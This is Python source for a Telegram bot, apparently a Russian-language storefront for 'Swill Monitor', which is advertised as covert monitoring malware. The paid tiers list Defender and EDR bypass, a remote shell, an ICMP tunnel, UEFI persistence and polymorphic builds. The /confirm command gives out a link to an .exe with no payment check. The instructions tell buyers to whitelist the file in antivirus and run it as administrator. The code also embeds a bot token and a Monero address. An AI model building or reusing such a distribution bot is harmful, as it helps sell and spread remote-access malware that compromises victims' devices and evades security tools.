import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

TOKEN = "8984654579:AAGaUlKtAjJd7wqR5BsaLEBMUeGKmztC-pM"

# ===== ЦЕНЫ И ССЫЛКИ =====
MONERO_ADDRESS = "46r6fC7DptBgov3ZQPtdzJ8Ge8o1fDiqe8UPPm1BxDLC4iHrFwn32PUWTXz3qH8jdaRMzuXG3obCdEbNncoJfMDHRMQ4N91"
FILE_URL = "https://tmpfiles.org/wRwDSeA58F4E/blackout.exe"

# ===== КОМАНДА /start =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Купить Lite — $99", callback_data="buy_lite")],
        [InlineKeyboardButton("Купить Pro — $299", callback_data="buy_pro")],
        [InlineKeyboardButton("Купить Enterprise — $999", callback_data="buy_enterprise")],
        [InlineKeyboardButton("🌐 Сайт", callback_data="site")],
        [InlineKeyboardButton("📖 Инструкция", callback_data="instructions")],
        [InlineKeyboardButton("🛠 Поддержка", callback_data="support")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "👋 Добро пожаловать в Swill Monitor!\n\n"
        "Выберите тариф или перейдите на сайт:",
        reply_markup=reply_markup
    )

# ===== ОБРАБОТКА КНОПОК =====
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "site":
        await query.edit_message_text(
            "🌐 Мой сайт-визитка:\nhttps://RTYT232.github.io/portfolio/\n\n"
            "Заказы принимаю здесь — @RATNIKIPCbot"
        )

    elif data == "buy_lite":
        await query.edit_message_text(
            f"💰 Тариф Lite — $99\n\n"
            f"✅ До 5 устройств\n"
            f"✅ Базовый сбор логов\n"
            f"✅ Скрытый режим\n\n"
            f"💳 Оплата: Monero (XMR) или USDT\n"
            f"📬 Адрес для перевода:\n`{MONERO_ADDRESS}`\n\n"
            f"После оплаты напишите /confirm"
        )

    elif data == "buy_pro":
        await query.edit_message_text(
            f"💰 Тариф Pro — $299\n\n"
            f"✅ До 20 устройств\n"
            f"✅ Обход Defender\n"
            f"✅ Удалённый шелл\n"
            f"✅ ICMP-туннель\n\n"
            f"💳 Оплата: Monero (XMR) или USDT\n"
            f"📬 Адрес:\n`{MONERO_ADDRESS}`\n\n"
            f"После оплаты напишите /confirm"
        )

    elif data == "buy_enterprise":
        await query.edit_message_text(
            f"💰 Тариф Enterprise — $999\n\n"
            f"✅ Безлимит устройств\n"
            f"✅ UEFI-персистентность\n"
            f"✅ Полиморфный билд\n"
            f"✅ Обход EDR\n\n"
            f"💳 Оплата: Monero (XMR) или USDT\n"
            f"📬 Адрес:\n`{MONERO_ADDRESS}`\n\n"
            f"После оплаты напишите /confirm"
        )

    elif data == "instructions":
        await query.edit_message_text(
            "📖 Инструкция:\n\n"
            "1️⃣ Скачайте .exe\n"
            "2️⃣ Добавьте в исключения антивируса\n"
            "3️⃣ Запустите от имени администратора"
        )

    elif data == "support":
        await query.edit_message_text(
            "🛠 Напишите ваш вопрос — отвечу вручную."
        )

    else:
        await query.edit_message_text("❌ Неизвестная команда.")

# ===== КОМАНДА /confirm =====
async def confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"✅ Ссылка на скачивание:\n{ FILE_URL }\n\n"
        f"📌 Ссылка активна 24 часа.\n"
        f"Инструкция: /instructions"
    )

# ===== ЗАПУСК =====
def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("confirm", confirm))
    app.add_handler(CallbackQueryHandler(button))
    print("✅ Бот запущен!")
    app.run_polling()

if __name__ == "__main__":
    main()
